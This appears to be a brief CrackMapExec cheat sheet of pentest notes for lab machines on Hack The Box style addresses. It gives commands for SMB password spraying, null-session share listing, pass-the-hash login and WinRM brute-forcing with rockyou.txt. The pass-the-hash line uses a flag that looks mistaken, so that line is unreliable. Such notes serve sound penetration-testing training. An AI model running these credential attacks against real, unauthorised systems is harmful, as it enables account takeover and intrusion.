## Scan an smb for auth with same username and password

```
crackmapexec smb 10.10.10.172 -u passwords.txt -p passwords.txt --continue-on-success
```
##  Scan an smb for auth with no username or password

```
crackmapexec smb 10.10.10.175 --shares -u '' -p ''
```

## Login to smb with hash:

```
crackmapexec smb 10.10.10.175 -u admin -h ABKAKEWIEJJ
```
## Test to see if winrm can be accessed:

```
crackmapexec winrm 10.10.10.175 -u fsmith -p ThePassword
```

## WinRm same user with password sheet and domain

```
crackmapexec winrm 10.129.16.46 -u administrator -p /usr/share/wordlists/rockyou.txt -d unika.htb
```

## Cheat Sheets

https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/

https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html

## Gitbook

https://mpgn.gitbook.io/crackmapexec/
